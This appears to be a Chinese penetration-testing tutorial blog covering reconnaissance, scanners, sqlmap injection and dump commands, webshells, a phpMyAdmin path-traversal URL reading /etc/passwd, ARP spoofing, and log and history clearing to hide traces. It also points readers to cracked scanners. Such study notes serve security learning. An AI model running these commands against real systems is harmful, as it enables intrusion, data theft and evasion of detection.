基础字典包合并去重 123dymerge.py -upython pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txtpython pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt 推荐工具：白鹿社工字典 https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases 密码字典实时丰富更新。提取各种泄露数据中的各种类型的密码，然后按出现频率排序，比如键盘组合top100等等，就能得到各种类型的密码字典。 https://github.com/huyuanzhi2/password_brute_dictionary 2. 人工浏览\\逐个请求burp非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。 图片后台地址\\图片后面的信息跳转参数\\奇怪的参数泄露邮箱等社工信息业务逻辑\\架构 3.自动化自动化渗透测试框架:(待补充) Sn1per Ary railgun 自动化信息收集效率较高，从github上多找一找，也可以自己写： https://github.com/shmilylty/OneForAll 12python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./example.txt run 漏洞挖掘1. 漏洞扫描工具注意：登录类网站扫描要带cookies扫才能扫到 123456789AWVS网上总有最新破解版goby自动化漏扫框架，功能丰富，必备Nessus破解流程复杂，但是真的好用Netsparker综合型的web应用安全漏洞扫描工具，检查SQL和XSS比较擅长Xray也是必备的，渗透开始就挂着，鼠标点到哪里扫到哪里，联动burp和其他漏扫效果也不错 1.1 Nikto Web服务漏洞扫描器Tips：利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。 1nikto -host http://example.com -output ~/nikto.html -Format html NIKTO使用方法： 12345678910111213141、Nikto -update #升级，更新插件；2、Nikto -list-plugins #查看插件；3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；4、Nikto -host http://1.1.1.1 -output #扫描并输出结果5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号6、Nikto -host http://www.baidu.com -port 443 -ssl #扫描https网站7、Nikto -host 文件名.txt #批量扫描目标8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描9、nikto -host 192.168.0.1 -useproxy http://localhost:8070#利用代理进行扫描10、-vhost#当一个网站存在多个端口时可以使用-vhost 遍历所有网站进行扫描或一个ip对应多个网站11、Nikto交互形参数 配置文件： 路径：&#x2F;etc&#x2F;nikto.confUser Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；在nikto中最好修改成别的浏览器user agent；设置cookie：在配置文件中找到cookie进行设置（#STATIC-COOKIE&#x3D; “cookie1”&#x3D;”cookie value”;”cookie2”&#x3D;”cookie val”） IDS逃避技术： 主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host http://1.1.1.1 -evasion 1234）逃避方式共8种：1、随机url编码，2、自选路径，3、过早结束的URL4、优先考虑长随机字符串5、参数欺骗6、使用TAB作为命令的分隔符，7、使用变化的URL8、使用Windows路径分隔符 1.2 AWVS漏扫这个没什么好说的，破解版到处都是。 1.3 NESSUS实时更新插件的漏扫，很好用，就是激活流程麻烦。https://www.wuyini.cn/765.html 1.4 Xray自动化的漏洞挖掘burp+xray：BurpSuite + Xray 被动扫描配置 - Ritte - 博客园或者直接挂浏览器，点到哪里，扫到哪里xray+各种漏扫联动 1.5 FuzzFuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。Discover Content是Burp中专门用于此目的的工具。Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。FuzzDB包含一些用于此目的的非常牛逼的字典。 2.挖掘漏洞2.1 SQL注入初步测试：见框就上，加 and 1&#x3D;1、and 1&#x3D;2、and 2&#x3D;1 or 抓包爆破常用SQL注入payload字典，上burp intruder。 注入六连： sqlmap -u “http://www.xx.com?id=x&quot; 查询是否存在注入点 –dbs 检测站点包含哪些数据库 –current-db 获取当前的数据库名 –tables -D “db_name” 获取指定数据库中的表名 -D后接指定的数据库名称 –columns -T “table_name” -D “db_name” 获取数据库表中的字段 –dump -C “columns_name” -T “table_name” -D “db_name” 获取字段的数据内容 cookie注入 1sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX cookie&quot; --level 2 post注入 步骤如下： 打开burpsuite获取拦截信息（post），然后右键保存文件（post.txt）到指定目录下。 运行sqlmap并执行如下命令加载文件： sqlmap -r post.txt -p &quot;username&quot; -p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数） 自动获取表单：–forms自动获取表单 例如：sqlmap -u http://www.xx.com/login.asp --forms 指定参数搜索：–data 例如：sqlmap -u http://www.xx.com/login.asp --data &quot;username=1&quot; 123456789101112131415161718192021222324252627--purge 【重新扫描（--purge 删除原先对该目标扫描的记录】--tables 【获取表名】--dbs 【检测站点包含哪些数据库】--current-db 【获取当前的数据库名】--current-user 【检测当前用户】--is-dba 【判断站点的当前用户是否为数据库管理员】--batch 【默认确认，不询问你是否输入】--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）】--threads 10 【线程，sqlmap线程最高设置为10】--level 3 【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5】--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全】-v 【详细的等级(0-6)0：只显示Python的回溯，错误和关键消息。1：显示信息和警告消息。2：显示调试消息。3：有效载荷注入。4：显示HTTP请求。5：显示HTTP响应头。6：显示HTTP响应页面的内容】--privileges 【查看权限】--tamper xx.py,cc.py 【防火墙绕过，后接tamper库中的py文件】--method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot; 【POST方式提交数据】--threads number 【采用多线程 后接线程数】--referer &quot;&quot; 【使用referer欺骗】--user-agent &quot;&quot; 【自定义user-agent】--proxy “目标地址″ 【使用代理注入】 2.2 XSSxss漏洞原理分析与挖掘方法 - 知乎 XSS小结 - 先知社区 2020跨站点脚本[xss]速查表|雨苁 XSSer自动化工具 XSStrike 自动化绕过WAF XSS生成：http://xssor.io 漏洞利用getshgell常用的漏洞利用工具如下： SQL注入 ——&gt; Sqlmap XSS跨站脚本——&gt; Beef-XSS 抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件 文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马 但是，获得了webshell后，一般权限很低，所以我们需要提权， 可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马。 也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用。 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权。 后渗透（权限提升）见权限提升的文章 清除痕迹Windows系统 1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹 2：如果3389远程登录过，需要清除mstsc痕迹 3：执行命令清除日志： 1del %WINDR%\\* .log /a/s/q/f 4：如果是web应用，找到web日志文件，删除 Linux系统 1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令 1export HISTFILE=/dev/null export HISTSIZE=0 2：删除 &#x2F;var&#x2F;log 目录下的日志文件 3：如果是web应用，找到web日志文件，删除 撰写报告","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"基础概念与信息收集","slug":"渗透测试/1. 基础概念与信息收集","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T11:56:31.794Z","comments":true,"path":"posts/[object Object]/渗透测试/1. 基础概念与信息收集/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/undefined","excerpt":"","text":"基础概念与信息收集 1. 基础概念域名域名互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。 网域名称系统网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库。 二级域名或多级域名顶级域名 又叫一级域名，一串字符串中间一个点隔开，例如baidu.com。顶级域名是互联网DNS等级之中的最高级的域，它保存于DNS根域的名字空间中。 二级域名 实际上就是一个一级域名以下的主机名，一串字符串中间两个点隔开，例如www.baidu.com。二级域名就是最靠近顶级域名左侧的字段。 三级域名 二级域名的子域名,特征是包含三个点，例如mp.weixin.qq.com。 渗透时域名扫描 进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，然后可以由此横向到主网站。 比如layer子域名探测。 同源规则如果域名或 IP 地址、端口与协议都相同，那么就会被判定为同源。 DNS本地Hosts与DNS的关系Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。 Hosts文件是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 CDN是什么?与DNS的关系?CDN的全称是Content DeliveryNetwork，即内容分发网络。 基本思路 是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。 通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP，如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。） 使用CDN的目的 使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。 常见的DNS安全攻击 DDoS攻击 分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器（频繁的DNS解析请求）。其他服务器的回复会被发送到被伪造服务器的真实地址（真实IP对应的受害者收到大量回复），造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。 DNS缓存中毒（DNS欺骗） 向DNS服务器注入非法网络域名地址替换合法地址（修改合法URL在DNS服务器上的缓存为非法地址），将流量从合法服务器引导至虚假服务器上的攻击方式，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入DNS服务器缓存，用户的浏览器或者邮件服务器访问合法URL时就会自动跳转到DNS指定的非法地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。 域名劫持（DNS重定向） 通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。 DNS查询嗅探 利用对DNS的配置信息获取网络环境的信息，为之后的攻击做准备。 为此，需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。 ARP欺骗 ARP协议 在一个局域网内，广播ARP请求包，通过交换机，到达目标IP地址的PC机，从而获取对方的MAC地址。获取到之后会将IP和MAC地址的对应关系存入ARP缓存表，减少大量广播，降低网络拥塞。 在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。 比如在攻击机上执行如下命令，就是在告诉主机192.168.42.236，网关192.168.42.2的MAC地址是我，这样网络中就会充斥着这个ARP响应包，使得主机192.168.42.236的网络请求发送到攻击机，无法上网。 1arpspoof -i eth0 -t 192.168.42.236 192.168.42.2 本机劫持 本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。 后门 概念 指绕过安全控制而获取对程序或系统访问权的方法。最主要的目的就是方便以后再次秘密进入或者控制系统。 分类 网页后门 一般都是通过服务器上正常的web服务来构造自己的连接方式，便于控制网站，比如现在非常流行的ASP、cgi脚本后门等。 线程插入后门 利用系统自身的某个服务或者线程，将后门程序插入到其中（最流行）。 扩展后门 所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有更强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用。 C&#x2F;S后门（客户端服务器后门） 和传统的木马程序类似的控制方法，采用“客户端&#x2F;服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。可以进行脱库、盗取信息。 特点 即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。 web WEB的组成框架模型 网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。 各个层面对应的安全测试 通信层 主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。 应用层 应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。 系统层 主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。 管理层 主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。 2. 数据包扩展http&#x2F;https数据包 概念 HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。HTPP有多个版本，目前广泛使用的是HTTP&#x2F;1.1版本。 原理 HTTP是一个基于TCP&#x2F;IP通信协议来传递数据的协议，传输的数据类型为HTML文件、图片文件、查询结果等。HTTP协议一般用于B&#x2F;S架构，浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。 特点 http协议支持客户端&#x2F;服务端模式，也是一种请求&#x2F;响应模式的协议。 简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。 灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。 无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。 无状态：无状态是指协议对于事务处理没有记忆，服务器并不知道用户身份。如果后续处理需要前面的信息，则必须重传。（或者借助cookie URI和URL的区别HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。 URI：Uniform Resource Identifier 统一资源标识符。用来标示一个具体的资源，可以通过 URI 知道一个资源是什么。 URL：Uniform Resource Location 统一资源定位符。用来定位具体的资源的，标示了一个具体的资源位置，即通过URL知道一个资源在哪里。互联网上的每个文件都有一个唯一的URL。 HTTP报文组成HTTP报文由三部分组成：状态行(请求行 | 响应行)、首部、主体。 HTTP报文以状态行开始，跟在后面的是HTTP首部，首部由多个首部字段构成，每行一个首部字段；HTTP首部后是一个空行，然后是报文主体。 状态行和首部中的每行都是以回车符(\\r，%0d，CR)和换行符(\\n，%0a，LF)结束，这是因为HTTP规范中行应该使用CRLF结束。另外，首部和主体之间由一空行隔开，或者可以理解为HTTP首部的最后一个字段有两个CRLF。 与状态行和首部不同的是，主体是可选的，也就是说报文中不一定要有主体；另外状态行和首部是ASCII文本，主体可包含文本或二进制数据。 HTTP报文分为请求报文和响应报文；请求报文向服务器传达请求，响应报文将请求的结果返回给客户端。以下两图，分别是请求报文以及响应报文的结构图。 ​ 请求报文包括一下内容： 请求头：一些键值对，浏览器与web服务器之间都可以发送，特殊的某种含义HOST：主机或域名地址Accept：指浏览器或其他客户可以接受的MIME文件格式，servlet可以根据它判断并返回适当的文件格式User-Agent：是客户浏览器名称Host：对应网址URL中的web名称和端口号Accept-Language：指出浏览器可以接受的语言种类，如en或者en-us，指英语connection：用来告诉服务器是否可以维持固定的HTTP连接、http是无连接的，HTTP&#x2F;1.1使用Keep-Alive为默认值，这样当浏览器需要多个文件时（比如一个HTML文件和相关的图形文件），不需要每次都建立连接Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，他可以记载服务器相关的用户信息，也可以用来实现会话功能Referer：表明产生请求的网页URL，这个属性可以用来跟踪web请求是从什么网站来的。Content-Type ：用来表明request的内容类型，可以用HttpServeletRequest的getContentType()方法取得。Accept-Charset：指出浏览器可以接受的字符编码Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件传递速度。浏览器在接收到web响应之后再解码，然后再检查文件格式 空行：请求头与请求体之间用一个空行分开最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标 请求体：要发送的数据（一般post提交时候会用）使用POST传送，最常使用的是Content-Type和Content-Length头标 常见请求方法GET：请求指定的页面信息，并返回实体主体。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。post请求必须包含content-type和content-length请求头字段。 HEAD：类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。 PUT：从客户端向服务器传送的数据取代指定的文档的内容。 DELETE：请求服务器删除指定的页面。 get和post的区别 get请求： post请求： 编码和请求方式不同：get通过URL显式的请求，只能是ASCII码。post不会显示在URL，请求的参数存放在请求实体body中（例如提交表单或者上传文件），在报文内部，且编码不唯一；post比get更加安全； 请求的数据量不同：get请求的数据有限，不超过2k-4k（视浏览器而定），而post没有上限； 缓存性：get会进行缓存，而post没有； 可刷新性：get请求可刷新，由于有本地缓存，不会重复请求，而post请求在刷新时会重新提交请求； get多用来查询，请求参数放在url中，不会对服务器上的内容产生作用；post请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。 HTTPSHTTP很多信息是明文传输，因此不适合用来传输一些敏感信息，比如：各种账号、密码等信息，使用http协议传输隐私信息非常不安全。存在以下问题： 请求信息明文传输，容易被窃听截取。（机密性） 数据的完整性未校验，容易被篡改。（完整性） 没有验证对方身份，存在冒充危险。（不可抵赖性） HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：一般理解为HTTP+SSL&#x2F;TLS，通过 SSL证书来验证服务器的身份（SSL安全套接字层位于传输层和应用层之间），并为浏览器和服务器之间的通信进行加密。 HTTPS的缺点 HTTPS协议多次握手，导致页面的加载时间延长近50%； HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗； 申请SSL证书需要钱，功能越强大的证书费用越高。 SSL涉及到的安全算法会消耗 CPU 资源，对服务器资源消耗较大。 HTTP和HTTPS的区别 申请证书：https协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。 传输数据：http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl&#x2F;tls加密传输协议。 端口：http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。 安全性：http的连接很简单，是无状态的；HTTPS协议是由SSL&#x2F;TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。 3. 网站搭建安全 搭建环境：ASP、PHP、ASPx、JSP、PY、JAVAWEB等环境。 WEB源码中敏感文件：后台路径，数据库配置文件，备份文件等 IP或域名解析存在的安全问题：在进行网站的目录扫描时，要注意域名访问的时候一般只会指向某个目录（网站所在目录），而IP访问的时候指向的是上一级根目录（包含更多文件，特别是网站源码的备份文件），域名和IP两者访问的路径是不同的。 常见安全测试中的安全防护： （1）身份验证和访问控制，基于用户的限制（用户名密码、借助域控） （2）限制IP地址的访问（黑名单或白名单） （3）安全通信，使用客户端证书 后门是否给予执行权限 （1）设置相关权限，限制来宾用户的权限，导致连接了后门也看不到任何东西，它属于防护技巧，也是测试里经常碰到的问题； （2）设置了执行权限，如果没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用 绕过思路 将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面。 判断网站中间件： 响应包的server字段会显示中间件。 4. web源码安全5. 系统及数据库安全 操作系统层面 识别操作系统 方法一：网站路径修改大小写 windows对大小写不敏感，也就是说你在网页中可以替换网站路径的大小写进行测试； 方法二：nmap扫描 没有网站可以用于测试时，可以使用nmap扫描主机，获得主机的一些信息。如下： 1234567891011121314──(root💀kali)-[~/桌面]└─# nmap -O 10.1.1.10 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:06 CSTNmap scan report for 10.1.1.10 (10.1.1.10)Host is up (0.0011s latency).Not shown: 999 closed portsPORT STATE SERVICE22/tcp open sshMAC Address: 00:0C:29:13:E9:61 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop 备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中nmap也无法探测其操作系统类型。 方法三：TTL值 不同的操作系统的默认TTL值（网络中数据包的生存周期，经过多少次路由后自动丢弃，经过一次路由就减一）是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户在注册表中修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL： 12345WINDOWS NT/2000 TTL：128WINDOWS 95/98 TTL：32UNIX TTL：255LINUX TTL：64WIN7 TTL：64 比如，使用ping命令可以看到TTL为53，可以估计出TTL值原本为64，经过了11次路由。 123456C:\\Users\\cbcao&gt;ping baidu.com正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53来自 110.242.68.66 的回复: 字节=32 时间=42ms TTL=53 方法四：特殊端口 如（22 &#x2F; 139 &#x2F; 445 &#x2F; 1433 &#x2F; 3389） 识别操作系统的意义 不同操作系统对应着不同的漏洞、不同的利用条件。 数据库层面 识别数据库的常见方法 方法一：根据搭配的语言进行识别 123456默认的语言搭配的数据库组合类型 asp + access/mssql组合类型 php + mysql 组合类型 aspx+mssql组合类型 jsp +mysql/oracle组合类型 Python + MongoDB 方法二：根据端口号进行识别 12345678910常见的数据库默认端口号关系型数据库 mysql 3306 sqlserver 1433 oracle 1521 psotgresql 5432非关系型数据库 MongoDB 27017 Redis 6379 memcached 11211 识别数据库的意义 数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。 不同的数据库的攻击方式也不完全一样。 数据库漏洞的影响 数据库权限、网站权限、修改网页内容 漏洞演示 https://vulhub.org/#/environments/mysql/CVE-2012-2122/ 首先kali中进入metasploit：msfconsole 然后搜索mysql漏洞：search mysql 选择一个准备利用的漏洞，使用该模块： 然后按照rhost选项配置攻击机IP、线程数threads，接着执行run即可： 最后得到数据库密码的hash值： 1234567[+] 10.1.1.133:3306 - 10.1.1.133:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9[+] 10.1.1.133:3306 - 10.1.1.133:3306 Hash Table has been saved: /root/.msf4/loot/20210608111341_default_10.1.1.133_mysql.hashes_091970.txt[*] 10.1.1.133:3306 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmd5在线解密https://www.cmd5.com/ 第三方层面 如何判断有哪些第三方平台或软件：nmap 1234567891011121314151617nmap -O -sV 10.1.1.130Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 09:26 CSTNmap scan report for 10.1.1.130 (10.1.1.130)Host is up (0.00085s latency).Not shown: 978 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.422/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)23/tcp open telnet Linux telnetd25/tcp open smtp Postfix smtpd80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)111/tcp open rpcbind 2 (RPC #100000)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)512/tcp open exec?513/tcp open login?514/tcp open tcpwrapped 识别第三方平台或软件的意义 不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多。 渗透第三方平台或软件的目标 直接获取到软件的权限便于进一步的提权和攻击 漏洞演示 https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/ 首先进入该漏洞的目录，启动phpmyadmin： 123[root@hdss7-11 CVE-2018-12613]# pwd/opt/vulhub/vulhub-master/phpmyadmin/CVE-2018-12613[root@hdss7-11 CVE-2018-12613]# docker-compose up -d 成功访问phpmyadmin之后，访问http://10.1.1.133:8080/?target=db_sql.php%3f/../../../../../../../../etc/passwd实现漏洞利用，得到执行etc&#x2F;passwd的结果： 6. 加密编码算法 时间戳 在线转换工具：https://tool.lu/timestamp/ URL编码 base64编码 随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号。 unescape编码 和URL编码有点像，特点是一般是%U+四个数字对应着两个字符，主要运用于网站web应用。 AES加密 7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;CDN依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。 判断是否存在CDN服务 利用多节点技术进行请求返回判断http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。 https://get-site-ip.com/ cdn网站 https://tools.ipip.net/cdn.php CDN对安全测试的影响 CDN会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。 目前常见的CDN绕过技术 子域名查询 因为有些主站是做了CDN服务而子站是没有做CDN服务 邮件服务查询 因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。 国外地址请求 因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。 遗留文件、扫描全网 如PHPinfo信息当中会遗留出ip地址 黑暗引擎搜索 fofa、傻蛋、谛听、zoomeye、censys 特定文件dns历史记录，以量打量 CDN真实IP地址获取后绑定指向地址，即更改本地HOSTS解析指向文件 奇淫技巧 fackcdn、w8fuckcdn、zmap 借助漏洞 若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。 8. 信息收集、WAF站点搭建分析 目录型站点 主站上面存在其他的cms程序。 比如学生网站www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。 端口类站点 有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口。 子域名站点 比如bbs.goodlift.net是goodlift.net的子域名，且为不同的站点。 现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。 类似域名站点 例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息。 旁注，c段站点 旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。 C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段，最终拿下服务器，然后通过内网渗透的方式拿下渗透服务器。 查询服务器上站点：在线工具：https://www.webscan.cc/ 搭建软件特征站点 有的网站是借助于第三方的集成搭建工具实现，例如：PHPstudy、宝塔等环境。这样的集成环境搭建的危害就是泄露了详细的版本信息。 phpstudy搭建了之后，在默认的站点安装了phpmyadmin。有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入。 WAFWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。 识别WAF的存在：直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问，针对不同的厂商的waf可能存在着不同的绕过思路。 采用工具wafwoof，缺点是并不特别准确 获取地址：https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master 1234567891011# unzip wafw00f-master.zip # 解压# python3.8 setup.py install # 安装# ls -ld wafw00fdrwxr-xr-x 6 root root 4096 6月 10 17:22 wafw00f# cd wafw00f #python main.py https://www.hlszsb.com/ # 